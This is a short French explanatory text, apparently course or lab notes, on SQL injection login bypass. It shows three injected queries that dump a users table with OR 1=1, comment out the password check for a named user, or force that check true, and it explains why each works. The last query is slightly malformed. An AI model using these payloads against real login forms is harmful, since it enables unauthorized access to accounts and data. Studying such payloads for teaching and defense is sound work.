
1-
 Pour tenter de trouver les utilisateurs, on peut transformer la requête SQL en:
 ```SQL
select * from "users_table" where username=''OR 1=1;-- and password='' 
 ```
Ici, la requête SQL demande a la base de données de sortir tous les éléments de la table "users_table" où le nom d'utilisateur est " " ou 1=1. La base de donnée va donc envoyer le contenu de cette table puisque 1=1 est toujours vrai.
 2-
  Aussi, pour un utilisateur connu nommé "**target_user**", la requête de bypass peut être:
```SQL
 select * from 'users_table' where username='target_user'-- and password=''
```
Cette requête SQL met la partie vérifiant le mot de passe en commentaire, ce qui l'empêche d'être utilisée.
Ou encore, on peut tenter:
```SQL
select * from users where username='target_user' and password=' ' OR 1=1:
```
 Ici, on rend le check du mot de passe 'vrai' quelque soit la valeur, car on fait un "OR" avec une valeur toujours vraie.
